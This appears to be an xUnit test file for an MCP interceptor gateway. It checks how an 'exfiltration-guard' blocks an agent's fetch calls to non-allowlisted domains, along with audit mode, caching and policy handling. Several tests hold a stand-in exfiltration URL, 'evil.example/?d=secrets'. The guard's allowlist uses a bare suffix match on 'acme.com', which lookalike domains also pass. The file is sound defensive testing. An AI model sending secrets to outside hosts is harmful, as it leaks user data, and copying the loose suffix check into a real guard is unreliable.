using System.Collections.Concurrent;
using System.Text.Json;
using System.Text.Json.Nodes;
using ModelContextProtocol.Client;
using ModelContextProtocol.Interceptors.Client;
using ModelContextProtocol.Interceptors.Gateway;
using ModelContextProtocol.Interceptors.Protocol;
using ModelContextProtocol.Interceptors.Server;
using ModelContextProtocol.Protocol;
using ModelContextProtocol.Server;
using Xunit;

namespace ModelContextProtocol.Interceptors.Tests;

/// <summary>
/// End-to-end behavior over real MCP sessions (in-memory pipes): how rejections reach the client,
/// discovery caching, invoker role, policy, context, interop tolerance, and the client wrapper.
/// </summary>
public class GatewayBehaviorTests
{
    // ── How rejections reach the client ─────────────────────────────────────

    [Fact]
    public async Task BlockedToolCall_ReturnsToolErrorWithReason_ByDefault()
    {
        await using var rig = await Rig.CreateAsync([ExfiltrationGuard()]);

        var result = await rig.Proxy.CallToolAsync("fetch", new Dictionary<string, object?> { ["url"] = "https://evil.example/?d=secrets" });

        Assert.True(result.IsError);
        Assert.False(rig.BackendCalled);
        var text = Assert.IsType<TextContentBlock>(result.Content[0]).Text;
        Assert.Contains("blocked before reaching the server", text);
        Assert.Contains("exfiltration-guard: Domain evil.example is not allowlisted", text);

        var details = result.Meta![GatewayProxyConfigurator.RejectionMetaKey]!;
        Assert.Equal(-32602, details["code"]!.GetValue<int>());
        Assert.Equal("exfiltration-guard", details["validationErrors"]![0]!["interceptor"]!.GetValue<string>());
        Assert.Equal("$.arguments.url", details["validationErrors"]![0]!["path"]!.GetValue<string>());
    }

    [Fact]
    public async Task BlockedToolCall_ReturnsSepProtocolError_WhenConfigured()
    {
        await using var rig = await Rig.CreateAsync([ExfiltrationGuard()],
            gateway => gateway.ToolCallRejection = ToolCallRejectionMode.ProtocolError);

        var ex = await Assert.ThrowsAsync<McpProtocolException>(() =>
            rig.Proxy.CallToolAsync("fetch", new Dictionary<string, object?> { ["url"] = "https://evil.example" }).AsTask());

        Assert.Equal(McpErrorCode.InvalidParams, ex.ErrorCode);
        Assert.Contains("Interceptor validation failed (tools/call request): exfiltration-guard: Domain evil.example is not allowlisted", ex.Message);
        Assert.False(rig.BackendCalled);
    }

    [Fact]
    public async Task BlockedNonToolRequest_ReturnsSepProtocolError()
    {
        var blockPrompts = Interceptor("prompt-guard", InterceptorType.Validation, [InterceptionEvents.PromptsGet],
            (_, _) => Fail("$.name", "Prompt is not approved"));
        await using var rig = await Rig.CreateAsync([blockPrompts]);

        var ex = await Assert.ThrowsAsync<McpProtocolException>(() => rig.Proxy.GetPromptAsync("greet").AsTask());

        Assert.Equal(McpErrorCode.InvalidParams, ex.ErrorCode);
        Assert.Contains("prompt-guard: Prompt is not approved", ex.Message);
    }

    [Fact]
    public async Task AllowedToolCall_PassesThrough()
    {
        await using var rig = await Rig.CreateAsync([ExfiltrationGuard()]);

        var result = await rig.Proxy.CallToolAsync("fetch", new Dictionary<string, object?> { ["url"] = "https://acme.com/report" });

        Assert.NotEqual(true, result.IsError);
        Assert.True(rig.BackendCalled);
        Assert.Equal("fetched https://acme.com/report", Assert.IsType<TextContentBlock>(result.Content[0]).Text);
    }

    // ── Runtime behavior ────────────────────────────────────────────────────

    [Fact]
    public async Task Discovery_IsCachedAcrossOperations()
    {
        await using var rig = await Rig.CreateAsync([ExfiltrationGuard()]);

        for (var i = 0; i < 3; i++)
        {
            await rig.Proxy.CallToolAsync("echo", new Dictionary<string, object?> { ["message"] = "hi" });
        }

        Assert.Equal(1, rig.ListCalls);
    }

    [Fact]
    public async Task Observer_ReceivesEveryPhaseWithResolvedPolicy()
    {
        var observed = new ConcurrentQueue<InterceptorExecutionResult>();
        await using var rig = await Rig.CreateAsync([ExfiltrationGuard()], gateway =>
        {
            gateway.OnInterceptorsExecuted = observed.Enqueue;
            gateway.Policy = new InterceptorPolicy { Overrides = { ["exfiltration-guard"] = new() { Mode = InterceptorMode.Audit } } };
        });

        var result = await rig.Proxy.CallToolAsync("fetch", new Dictionary<string, object?> { ["url"] = "https://evil.example" });

        // Audit mode: the call goes through, and the trace says what would have happened.
        Assert.NotEqual(true, result.IsError);
        Assert.True(rig.BackendCalled);
        var request = Assert.Single(observed, r => r.Phase == InterceptorPhase.Request);
        var invocation = Assert.Single(request.Invocations);
        Assert.Equal(InterceptorEffect.WouldBlock, invocation.Effect);
        Assert.Equal(InterceptorPolicySource.Override, invocation.ModeSource);
        Assert.Equal("test-interceptors", invocation.Server);
        Assert.Contains(observed, r => r.Phase == InterceptorPhase.Response);
    }

    [Fact]
    public async Task ServerRole_ValidatesRequestsBeforeMutatingThem()
    {
        var order = new ConcurrentQueue<string>();
        McpServerInterceptor[] interceptors =
        [
            Interceptor("normalizer", InterceptorType.Mutation, [InterceptionEvents.ToolsCall], (_, _) =>
            {
                order.Enqueue("mutate");
                return new ValueTask<InterceptorResult>(new MutationInterceptorResult { Modified = false });
            }, phase: InterceptorPhase.Request),
            Interceptor("schema-check", InterceptorType.Validation, [InterceptionEvents.ToolsCall], (_, _) =>
            {
                order.Enqueue("validate");
                return new ValueTask<InterceptorResult>(ValidationInterceptorResult.Success());
            }, phase: InterceptorPhase.Request),
        ];

        await using var clientSide = await Rig.CreateAsync(interceptors);
        await clientSide.Proxy.CallToolAsync("echo", new Dictionary<string, object?> { ["message"] = "x" });
        var clientOrder = order.ToArray();
        order.Clear();

        await using var serverSide = await Rig.CreateAsync(interceptors, gateway => gateway.InvokerRole = InterceptorInvokerRole.Server);
        await serverSide.Proxy.CallToolAsync("echo", new Dictionary<string, object?> { ["message"] = "x" });

        Assert.Equal(["mutate", "validate"], clientOrder);
        Assert.Equal(["validate", "mutate"], order.ToArray());
    }

    [Fact]
    public async Task Invocations_CarryTimestampAndSessionContext()
    {
        InvokeInterceptorContext? seen = null;
        var spy = Interceptor("spy", InterceptorType.Validation, [InterceptionEvents.ToolsCall], (req, _) =>
        {
            seen = req.Context;
            return new ValueTask<InterceptorResult>(ValidationInterceptorResult.Success());
        }, phase: InterceptorPhase.Request);
        await using var rig = await Rig.CreateAsync([spy], gateway => gateway.DefaultContext = new() { TraceId = "trace-1" });

        await rig.Proxy.CallToolAsync("echo", new Dictionary<string, object?> { ["message"] = "x" });

        Assert.NotNull(seen?.Timestamp);
        Assert.True(DateTimeOffset.TryParse(seen!.Timestamp, out _));
        Assert.Equal("trace-1", seen.TraceId);
    }

    [Fact]
    public async Task RequiredInterceptorMissing_FailsClosed()
    {
        await using var rig = await Rig.CreateAsync([ExfiltrationGuard()], gateway =>
            gateway.Policy = new InterceptorPolicy { Include = new HashSet<string> { "exfiltration-guard", "pii-redactor" } });

        var result = await rig.Proxy.CallToolAsync("echo", new Dictionary<string, object?> { ["message"] = "x" });

        Assert.True(result.IsError);
        Assert.False(rig.BackendCalled);
        Assert.Contains("pii-redactor", Assert.IsType<TextContentBlock>(result.Content[0]).Text);
    }

    [Fact]
    public async Task DownLevelClient_SetLoggingLevel_IsAcceptedWhenBackendHopIsCurrent()
    {
        // Found with the MCP Inspector CLI: it negotiates an older revision with the proxy and sends
        // logging/setLevel, which the proxy's 2026-07-28 backend session no longer supports.
        var backendSawSetLevel = false;
        var (backendServer, backend) = await McpInterceptorGatewayTests.GatewayTestFixture.CreateServerClientPairForTesting("backend", options =>
        {
            options.Capabilities ??= new();
#pragma warning disable MCP9005
            options.Capabilities.Logging = new();
            options.Handlers.SetLoggingLevelHandler = (_, _) => { backendSawSetLevel = true; return new ValueTask<EmptyResult>(new EmptyResult()); };
#pragma warning restore MCP9005
        });
        var (interceptorServer, interceptors) = await McpInterceptorGatewayTests.GatewayTestFixture.CreateServerClientPairForTesting(
            "interceptors", options => new InterceptorServerOptionsSetup([ExfiltrationGuard()]).Configure(options));
        await using var gateway = new McpInterceptorGateway(new McpInterceptorGatewayOptions { BackendClient = backend, InterceptorClients = [interceptors] });
        var (proxyServer, proxy) = await McpInterceptorGatewayTests.GatewayTestFixture.CreateServerClientPairForTesting(
            "proxy", gateway.ConfigureServerOptions, protocolVersion: "2025-06-18");
        await using (backendServer) await using (backend) await using (interceptorServer) await using (interceptors) await using (proxyServer) await using (proxy)
        {
            Assert.Equal("2025-06-18", proxy.NegotiatedProtocolVersion);
            Assert.True(string.CompareOrdinal(backend.NegotiatedProtocolVersion, "2026-07-28") >= 0);

#pragma warning disable MCP9005
            await proxy.SetLoggingLevelAsync(LoggingLevel.Warning);
#pragma warning restore MCP9005

            Assert.False(backendSawSetLevel);
        }
    }

    // ── Interop tolerance ───────────────────────────────────────────────────

    [Fact]
    public async Task Orchestrator_ReadsResultsWithoutTypeAndWithFractionalDuration()
    {
        // A server written from the SEP's response examples: no "type", "interceptor" first,
        // and a fractional durationMs as a float-based SDK would send it (#49, #50).
        var (server, client) = await McpInterceptorGatewayTests.GatewayTestFixture.CreateServerClientPairForTesting(
            "raw-interceptors",
            options => options.Filters.Message.IncomingFilters.Add(next => async (context, ct) =>
            {
                if (context.JsonRpcMessage is not JsonRpcRequest request)
                {
                    await next(context, ct);
                    return;
                }

                JsonNode? result = request.Method switch
                {
                    InterceptorRequestMethods.InterceptorsList => JsonNode.Parse(
                        """{"interceptors":[{"name":"raw","type":"validation","hooks":[{"events":["*"],"phase":"request"}]}]}"""),
                    InterceptorRequestMethods.InterceptorInvoke => JsonNode.Parse(
                        """{"interceptor":"raw","phase":"request","durationMs":0.0072,"valid":false,"severity":"error","messages":[{"message":"nope","severity":"error"}]}"""),
                    _ => null,
                };

                if (result is null)
                {
                    await next(context, ct);
                    return;
                }

                await context.Server.SendMessageAsync(new JsonRpcResponse { Id = request.Id, Result = result }, ct);
            }));
        await using var _ = server;
        await using var __ = client;

        var execution = await InterceptorOrchestrator.ExecuteAsync([client], new InterceptorExecutionRequest
        {
            Event = InterceptionEvents.ToolsCall,
            Phase = InterceptorPhase.Request,
            Payload = new JsonObject(),
        });

        Assert.Equal(InterceptorExecutionStatus.ValidationFailed, execution.Status);
        Assert.Equal("nope", execution.ValidationErrors[0].Message);
    }

    [Theory]
    [InlineData("""{"name":"x","event":"tools/call","phase":"request","payload":{},"timeoutMs":5000.0}""", 5000)]
    [InlineData("""{"name":"x","event":"tools/call","phase":"request","payload":{},"timeoutMs":1499.5}""", 1500)]
    public void InvokeParams_AcceptFractionalTimeout(string json, int expected)
    {
        var parsed = JsonSerializer.Deserialize<InvokeInterceptorRequestParams>(json, InterceptorJsonUtilities.DefaultOptions)!;

        Assert.Equal(expected, parsed.TimeoutMs);
        Assert.Contains($"\"timeoutMs\":{expected}", JsonSerializer.Serialize(parsed, InterceptorJsonUtilities.DefaultOptions));
    }

    [Fact]
    public void Results_AcceptTypeDiscriminatorAfterOtherProperties()
    {
        var result = JsonSerializer.Deserialize<InterceptorResult>(
            """{"interceptor":"r","phase":"response","modified":true,"payload":{"a":1},"type":"mutation"}""",
            InterceptorJsonUtilities.DefaultOptions);

        var mutation = Assert.IsType<MutationInterceptorResult>(result);
        Assert.True(mutation.Modified);
    }

    // ── InterceptingMcpClient ───────────────────────────────────────────────

    [Fact]
    public async Task InterceptingClient_ListTools_AppliesResponseMutations()
    {
        var hideFetch = Interceptor("tool-filter", InterceptorType.Mutation, [InterceptionEvents.ToolsList], (req, _) =>
        {
            var payload = req.Payload.DeepClone();
            var tools = payload["tools"]!.AsArray();
            foreach (var tool in tools.Where(t => t!["name"]!.GetValue<string>() == "fetch").ToList())
            {
                tools.Remove(tool);
            }

            return new ValueTask<InterceptorResult>(new MutationInterceptorResult { Modified = true, Payload = payload });
        }, phase: InterceptorPhase.Response);
        await using var rig = await Rig.CreateAsync([hideFetch]);
        await using var client = new InterceptingMcpClient(rig.Backend, new() { InterceptorClient = rig.InterceptorClient });

        var tools = await client.ListToolsAsync();

        Assert.Equal(["echo"], tools.Select(t => t.Name));
    }

    [Fact]
    public async Task InterceptingClient_ThrowsValidationExceptionWithAllErrors()
    {
        await using var rig = await Rig.CreateAsync([ExfiltrationGuard()]);
        await using var client = new InterceptingMcpClient(rig.Backend, new() { InterceptorClient = rig.InterceptorClient });

        var ex = await Assert.ThrowsAsync<McpInterceptorValidationException>(() =>
            client.CallToolAsync("fetch", new Dictionary<string, object?> { ["url"] = "https://evil.example" }).AsTask());

        Assert.Equal("exfiltration-guard", Assert.Single(ex.ValidationErrors).Interceptor);
        Assert.Equal(InterceptorExecutionStatus.ValidationFailed, ex.ExecutionResult!.Status);
        Assert.False(rig.BackendCalled);
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private static McpServerInterceptor ExfiltrationGuard() =>
        Interceptor("exfiltration-guard", InterceptorType.Validation, [InterceptionEvents.ToolsCall], (req, _) =>
        {
            if (req.Payload["name"]?.GetValue<string>() != "fetch" ||
                !Uri.TryCreate(req.Payload["arguments"]?["url"]?.GetValue<string>(), UriKind.Absolute, out var uri) ||
                uri.Host.EndsWith("acme.com", StringComparison.OrdinalIgnoreCase))
            {
                return new ValueTask<InterceptorResult>(ValidationInterceptorResult.Success());
            }

            return Fail("$.arguments.url", $"Domain {uri.Host} is not allowlisted");
        }, phase: InterceptorPhase.Request);

    private static ValueTask<InterceptorResult> Fail(string path, string message) =>
        new(ValidationInterceptorResult.Failure(new ValidationMessage { Path = path, Message = message, Severity = ValidationSeverity.Error }));

    private static McpServerInterceptor Interceptor(
        string name,
        InterceptorType type,
        string[] events,
        Func<InvokeInterceptorRequestParams, CancellationToken, ValueTask<InterceptorResult>> handler,
        InterceptorPhase phase = InterceptorPhase.Both)
    {
        IList<InterceptorHook> hooks = phase == InterceptorPhase.Both
            ? [new() { Events = [.. events], Phase = InterceptorPhase.Request }, new() { Events = [.. events], Phase = InterceptorPhase.Response }]
            : [new() { Events = [.. events], Phase = phase }];
        return new DelegateInterceptor(new Interceptor { Name = name, Type = type, Hooks = hooks }, handler);
    }

    private sealed class DelegateInterceptor(
        Interceptor descriptor,
        Func<InvokeInterceptorRequestParams, CancellationToken, ValueTask<InterceptorResult>> handler) : McpServerInterceptor
    {
        public override Interceptor ProtocolInterceptor => descriptor;
        public override IReadOnlyList<object> Metadata => [];
        public override ValueTask<InterceptorResult> InvokeAsync(
            InvokeInterceptorRequestParams request, McpServer server, IServiceProvider? services, CancellationToken cancellationToken = default) =>
            handler(request, cancellationToken);
    }

    /// <summary>Backend server + interceptor server + gateway + proxy client, all in memory.</summary>
    private sealed class Rig : IAsyncDisposable
    {
        private readonly List<IAsyncDisposable> _disposables = [];
        private int _listCalls;
        private int _backendCalls;

        public McpClient Backend { get; private set; } = null!;
        public McpClient InterceptorClient { get; private set; } = null!;
        public McpClient Proxy { get; private set; } = null!;
        public int ListCalls => Volatile.Read(ref _listCalls);
        public bool BackendCalled => Volatile.Read(ref _backendCalls) > 0;

        public static async Task<Rig> CreateAsync(
            McpServerInterceptor[] interceptors,
            Action<McpInterceptorGatewayOptions>? configureGateway = null)
        {
            var rig = new Rig();
            try
            {
                var (backendServer, backend) = await Pair("test-backend", rig.ConfigureBackend);
                rig._disposables.Add(backendServer);
                rig.Backend = backend;

                var (interceptorServer, interceptorClient) = await Pair("test-interceptors", options =>
                {
                    options.Filters.Message.IncomingFilters.Add(next => async (context, ct) =>
                    {
                        if (context.JsonRpcMessage is JsonRpcRequest { Method: InterceptorRequestMethods.InterceptorsList })
                        {
                            Interlocked.Increment(ref rig._listCalls);
                        }

                        await next(context, ct);
                    });
                    new InterceptorServerOptionsSetup(interceptors).Configure(options);
                });
                rig._disposables.Add(interceptorServer);
                rig.InterceptorClient = interceptorClient;

                var gatewayOptions = new McpInterceptorGatewayOptions
                {
                    BackendClient = backend,
                    InterceptorClients = [interceptorClient],
                };
                configureGateway?.Invoke(gatewayOptions);
                var gateway = new McpInterceptorGateway(gatewayOptions);
                rig._disposables.Add(gateway);

                var (proxyServer, proxy) = await Pair("test-proxy", gateway.ConfigureServerOptions);
                rig._disposables.Add(proxyServer);
                rig._disposables.Add(proxy);
                rig.Proxy = proxy;

                rig._disposables.Add(interceptorClient);
                rig._disposables.Add(backend);
                return rig;
            }
            catch
            {
                await rig.DisposeAsync();
                throw;
            }
        }

        private void ConfigureBackend(McpServerOptions options)
        {
            options.Capabilities ??= new();
            options.Capabilities.Tools = new();
            options.Capabilities.Prompts = new();
            options.Handlers.ListToolsHandler = (_, _) => new ValueTask<ListToolsResult>(new ListToolsResult
            {
                Tools =
                [
                    new Tool { Name = "echo", Description = "Echo" },
                    new Tool { Name = "fetch", Description = "Fetch a URL" },
                ],
            });
            options.Handlers.CallToolHandler = (request, _) =>
            {
                Interlocked.Increment(ref _backendCalls);
                var args = request.Params!.Arguments ?? new Dictionary<string, JsonElement>();
                var text = request.Params.Name == "fetch"
                    ? $"fetched {args["url"].GetString()}"
                    : args.TryGetValue("message", out var message) ? message.GetString()! : "";
                return new ValueTask<CallToolResult>(new CallToolResult { Content = [new TextContentBlock { Text = text }] });
            };
            options.Handlers.ListPromptsHandler = (_, _) => new ValueTask<ListPromptsResult>(new ListPromptsResult
            {
                Prompts = [new Prompt { Name = "greet" }],
            });
            options.Handlers.GetPromptHandler = (_, _) => new ValueTask<GetPromptResult>(new GetPromptResult
            {
                Messages = [new PromptMessage { Role = Role.User, Content = new TextContentBlock { Text = "hello" } }],
            });
        }

        private static Task<(McpServer, McpClient)> Pair(string name, Action<McpServerOptions> configure) =>
            McpInterceptorGatewayTests.GatewayTestFixture.CreateServerClientPairForTesting(name, configure);

        public async ValueTask DisposeAsync()
        {
            for (var i = _disposables.Count - 1; i >= 0; i--)
            {
                try { await _disposables[i].DisposeAsync(); } catch { }
            }
        }
    }
}
